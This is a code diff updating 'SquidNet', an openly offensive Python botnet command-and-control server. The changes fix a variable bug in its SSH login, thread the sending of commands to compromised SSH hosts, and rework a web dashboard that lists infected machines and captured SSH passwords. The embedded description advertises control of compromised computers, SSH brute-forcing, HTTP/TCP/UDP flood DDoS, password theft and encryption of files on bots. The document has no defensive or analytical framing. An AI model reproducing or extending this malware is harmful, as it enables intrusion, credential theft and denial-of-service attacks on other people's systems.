@@ -1,5 +1,9 @@
 import urllib.request, random, socket, time, sys, threading, random, os, hashlib, datetime
-from cryptography.fernet import Fernet
+try:
+    """This Module comes with Paramiko."""
+    from cryptography.fernet import Fernet
+except:
+    pass
 from optparse import OptionParser
 
 class ArguementParse:
@@ -36,17 +40,8 @@ tar -xf {os.getcwd()}/ngrok.zip
         """Displays help for arguement parsing(good for first time users).
         Allows the user to know what the arguements do as well as well as
         how to use them."""
+        print(Botnet.log_logo(None))
         print("""
-  _____             _     _ _   _      _             __   ___  
- / ____|           (_)   | | \ | |    | |           / /  / _ \ 
-| (___   __ _ _   _ _  __| |  \| | ___| |_  __   __/ /_ | | | |
- \___ \ / _` | | | | |/ _` | . ` |/ _ \ __| \ \ / / '_ \| | | |
- ____) | (_| | |_| | | (_| | |\  |  __/ |_   \ V /| (_) | |_| |
-|_____/ \__, |\__,_|_|\__,_|_| \_|\___|\__|   \_/  \___(_)___/ 
-           | |                                                 
-           |_|                                                                                                                                                     
-TCP and SSH Botnet Hybrid Command and Control Server By DrSquid
-
 [+] Option-Parsing Help:
 [+] --ip, --ipaddr     - Specifies the IP to host the Botnet on.
 [+] --p,  --port       - Specifies the Port to host the Botnet on.
@@ -104,6 +99,8 @@ TCP and SSH Botnet Hybrid Command and Control Server By DrSquid
         else:
             try:
                 port = int(arg.port)
+                if port == 8080:
+                    port = 80
             except:
                 Botnet.logo(None)
                 print("[+] Invalid port provided! Must be an integer!")
@@ -137,8 +134,8 @@ TCP and SSH Botnet Hybrid Command and Control Server By DrSquid
                 sys.exit()
         else:
             ngrokport = None
-        self.botnet = Botnet(ip, port, adminuser, adminpass, key, passfile, ngrokhost, ngrokport)
         self.webinterface = Web_Interface("localhost", 8080)
+        self.botnet = Botnet(ip, port, adminuser, adminpass, key, passfile, ngrokhost, ngrokport)
 class Botnet:
     """Main Class Made for the BotNet. Everything important
     and needed for the Botnet is located in this class."""
@@ -172,6 +169,7 @@ class Botnet:
             self.log(
                 "\n[(ERROR)]: Error starting up server - Brute-forcing file is not in directory!\n[(CLOSE)]: Server is closing.....")
             sys.exit()
+        self.version = "6.0"
         self.conn_list = []
         self.admin_conn = []
         self.ips = []
@@ -202,7 +200,7 @@ class Botnet:
         item = f"\n[(SERVER)]: Server started: {datetime.datetime.today()}\n[(SERVER)]: Successfully started server on: {self.ngroklink}:{self.ngrokport}\n[(SERVER)]: Listening for connections.....\n[(SERVER)]: Encryption key used: {self.key}"
         self.log(item)
         print(f"\n[+] Hosting Server at {self.ngroklink}:{self.ngrokport}")
-        print("[+] Web-Interface Successfully Created: http://127.0.0.1:8080")
+        print("[+] Web-Interface For More Info: http://127.0.0.1:8080")
         print("[+] Botnet is Up! Listening for connections.....\n")
         print(f"[+] This Server is being logged!\n[+] Server Log File: {self.logfile}")
         print(f"\n[+] Use this token when encrypting!: {key}")
@@ -609,8 +607,8 @@ TCP and SSH Botnet Hybrid Command and Control Server By DrSquid"""
         """Does regular logging in with SSH into the provided ip and username. There is no
         brute-forcing since a password arguement has be passed, and that the brute-force text
         file is not used."""
-        print(f"[+] Attempting to login to {ip}@{username}\n[+] With password: {password}")
-        msgtoadmin = f"[(SERVER)]: Attempting to login to {ip}@{username}\n[(SERVER)]: With password: {password}"
+        print(f"[+] Attempting to login to {username}@{ip}\n[+] With password: {password}")
+        msgtoadmin = f"[(SERVER)]: Attempting to login to {username}@{ip}\n[(SERVER)]: With password: {password}"
         self.log('\n' + msgtoadmin)
         for admin in self.admin_conn:
             try:
@@ -624,7 +622,7 @@ TCP and SSH Botnet Hybrid Command and Control Server By DrSquid"""
             self.ips.append(ip)
             self.display_bots.append(f"{username}@{ip}")
             self.ssh_bots.append(client)
-            self.ssh_info.append(str(username) + " " + str(ip) + " " + str(passw))
+            self.ssh_info.append(str(username) + " " + str(ip) + " " + str(password))
             self.ssh_botlist.append(str(client) + ' ' + str(username))
             msgtoadmin = f"[(SERVER)]: {ip}'s Password has been found!: {password}\n[(SERVER)] Adding {username}@{ip} to the botnet.\n"
             self.log('\n' + msgtoadmin)
@@ -636,7 +634,7 @@ TCP and SSH Botnet Hybrid Command and Control Server By DrSquid"""
             print(f"\n[!] Successfully logged into {username}@{ip} with {password}!\n[!] Adding {username}@{ip} to the botnet.\n")
         except Exception as e:
             print(f"[+] Unable to login to {ip}@{username}\n[+] Try using different credentials.")
-            msgtoadmin = f"[(SERVER)]: Unable to log into {username}@{ip}."
+            msgtoadmin = f"[(SERVER)]: Unable to log into {username}@{ip} due to: {e}"
             self.log("\n" + msgtoadmin)
             for admin in self.admin_conn:
                 try:
@@ -853,11 +851,13 @@ TCP and SSH Botnet Hybrid Command and Control Server By DrSquid"""
 [+] - Added Bot file editing.
 [+] - Added Bot file creation.
 [+] - Added Web-Interface(http://127.0.0.1:8080)!
+[+] - Fixed Variable bug in regular SSH Login Function(passw-->password)
 [+] - Optimized the code a little.
 [+] - Added Rick Roll command.
                     """)
                 if self.instruction != "!clear":
-                    self.send_ssh(self.instruction)
+                    sendtossh = threading.Thread(target=self.send_ssh, args=(self.instruction,))
+                    sendtossh.start()
                 self.log(f"\n[(SERVER)---->(ADMINS)]: Sent '{self.instruction}' to the bots.")
                 for conn in self.conn_list:
                     try:
@@ -4781,7 +4781,7 @@ class Web_Interface:
         self.packetmaker.start()
     def packetmaker(self):
         """This function generates the packet to send
-        to the client."""
+        to the client and also for updating the Web-Interface."""
         while True:
             try:
                 conn_bots = ""
@@ -4797,89 +4797,89 @@ class Web_Interface:
                     conn_ssh += '<tr>\n<td>' + x.split()[0] + '</td>\n<td>' + x.split()[1] + "</td>\n<td>" + x.split()[
                         2] + "</td>\n</tr>\n"
                 self.packet = """
-                <!DOCTYPE html>
-                <html lang="en">
-                <meta charset="UTF-8">
-                <head>
-                <style>
-                        table {
-                            border: 3px solid black;
-                            font-size: 50px
-                            border-collapse: collapse;
-                            font: arial;
+<!DOCTYPE html>
+<html lang="en">
+<meta charset="UTF-8">
+<title>SquidNet Web-Interface</title>
+<head>
+<style>
+        table {
+            border: 3px solid black;
+            font-size: 50px
+            border-collapse: collapse;
+            font: arial;
 
-                        }
+        }
 
-                        td, th {
-                            border: 1px solid black;
-                            padding: 5px;
+        td, th {
+            border: 1px solid black;
+            padding: 5px;
 
-                        }
+        }
 
-                    </style>
-                </head>
-                <body>
-                <h1>SquidNet Web Interface<h1>
-                <h3>(Clearly HTML is not my base language so it doesn't look too good)<h3>
-                <h1>Connections To the Botnet<h1>
-                <table>
-                <thead>
-                <tr>
-                <th>Hostname</th>
-                <th>IP Address</th>
-                <th>UserName</th>
-                <th>Connection</th>
-                <th>OS</th>
-                </tr>
-                </thead>
-                <tbody>
-                """ + str(conn_bots) + """
-                </tbody>
-                </table>
-                <h1>Admin Connections To the Botnet<h1>
-                <table>
-                <thead>
-                <tr>
-                <th>Hostname</th>
-                <th>IP Address</th>
-                <th>UserName</th>
-                <th>Connection</th>
-                <th>OS</th>
-                </tr>
-                </thead>
-                <tbody>
-                """+str(conn_admin)+"""
-                </tbody>
-                </table>
-                <h1>SSH Connections to the Botnet</h1>
-                <table>
-                <thead>
-                <tr>
-                <th>Hostname</th>
-                <th>IP Address</th>
-                <th>Password</th>
-                </tr>
-                </thead>
-                <tbody>
-                """+str(conn_ssh)+"""
-                </tbody>
-                </table>
-                <h1></h1>
-                <h2>About:</h2>
-                </h4>Squidnet is an SSH and TCP Botnet Hybrid. The Botnet has the ability to take control of computers compromised by the
-                bot script, as well as gaining access to ssh servers. It also has a form of security in which admins need to provide a username and
-                a password in order to gain access. They will be kicked if they do not enter the correct credentials. The Bots can do many
-                things including DDoS Attacks(HTTP, TCP and UDP Floods), sending their passwords to the Botnet, editing files remotely,
-                and many more.</h4>
-                <h2>Important Info</h2>
-                <h4>Server Log file: """+os.getcwd()+"""\\servlog.txt - Good for checking for errors and server output.</h4>
-                <h4>Server IP: """+str(botnet.botnet.ngroklink)+""":"""+str(botnet.botnet.ngrokport)+""" - How Bots will connect to the Botnet.</h4>
-                <h4>Admin Username: """+str(botnet.botnet.admin_name)+""" - Username Used by Admins to obtain access to the Botnet</h4>
-                <h4>Admin Password: """+str(botnet.botnet.passw)+""" - Password Used by Admins to obtain access to the Botnet.</h4>
-                <h4>Encryption Token: """+str(botnet.botnet.key)+""" - Used for encrypting files on the bots.</h4>
-                <h4>Brute-Forcing-File: """+str(botnet.botnet.passfilename)+""" - Used for SSH-Brute-Forcing.</h4>
-                </body>
-                </html>
+    </style>
+</head>
+<body>
+<h1>SquidNet Web Interface<h1>
+<h3>(Clearly HTML is not my base language so it doesn't look too good)<h3>
+<h1>Connections To the Botnet<h1>
+<table>
+<thead>
+<tr>
+<th>Hostname</th>
+<th>IP Address</th>
+<th>UserName</th>
+<th>Connection</th>
+<th>OS</th>
+</tr>
+</thead>
+<tbody>
+""" + str(conn_bots) + """
+</tbody>
+</table>
+<h1>Admin Connections To the Botnet<h1>
+<table>
+<thead>
+<tr>
+<th>Hostname</th>
+<th>IP Address</th>
+<th>UserName</th>
+<th>Connection</th>
+<th>OS</th>
+</tr>
+</thead>
+<tbody>
+"""+str(conn_admin)+"""
+</tbody>
+</table>
+<h1>SSH Connections to the Botnet</h1>
+<table>
+<thead>
+<tr>
+<th>Hostname</th>
+<th>IP Address</th>
+<th>Password</th>
+</tr>
+</thead>
+<tbody>
+"""+str(conn_ssh)+"""
+</tbody>
+</table>
+<h2>About:</h2>
+</h4>Squidnet is an SSH and TCP Botnet Hybrid. The Botnet has the ability to take control of computers compromised by the
+bot script, as well as gaining access to ssh servers. It also has a form of security in which admins need to provide a username and
+a password in order to gain access. They will be kicked if they do not enter the correct credentials. The Bots can do many
+things including DDoS Attacks(HTTP, TCP and UDP Floods), sending their passwords to the Botnet, editing files remotely,
+and many more.</h4>
+<h2>Important Info</h2>
+<h4>Server Log file: """+os.getcwd()+"""\\servlog.txt - Good for checking for errors and server output.</h4>
+<h4>Server IP: """+str(botnet.botnet.ngroklink)+""":"""+str(botnet.botnet.ngrokport)+""" - How Bots will connect to the Botnet.</h4>
+<h4>Admin Username: """+str(botnet.botnet.admin_name)+""" - Username Used by Admins to obtain access to the Botnet</h4>
+<h4>Admin Password: """+str(botnet.botnet.passw)+""" - Password Used by Admins to obtain access to the Botnet.</h4>
+<h4>Encryption Token: """+str(botnet.botnet.key)+""" - Used for encrypting files on the bots.</h4>
+<h4>Brute-Forcing-File: """+str(botnet.botnet.passfilename)+""" - Used for SSH-Brute-Forcing.</h4>
+</body>
+</html>
                             """
             except Exception as e:
                 pass
@@ -4898,14 +4898,18 @@ class Web_Interface:
         conn.send('\n'.encode())
         conn.send(self.packet.encode())
         conn.close()
-
+        
+"""Clears CMD Output."""
 if sys.platform == "win32":
     os.system("cls")
 else:
     os.system("clear")
 try:
+    """Tries to import this module."""
     import paramiko
 except:
+    """Since paramiko is not an official Python Module,
+    the user may need to download Paramiko themself."""
     Botnet.logo(None)
     print("\n[+] Missing Module: Paramiko\n[+] If you have python 3 installed, try: pip install paramiko")
     input("[+] Press 'Enter' to exit.")
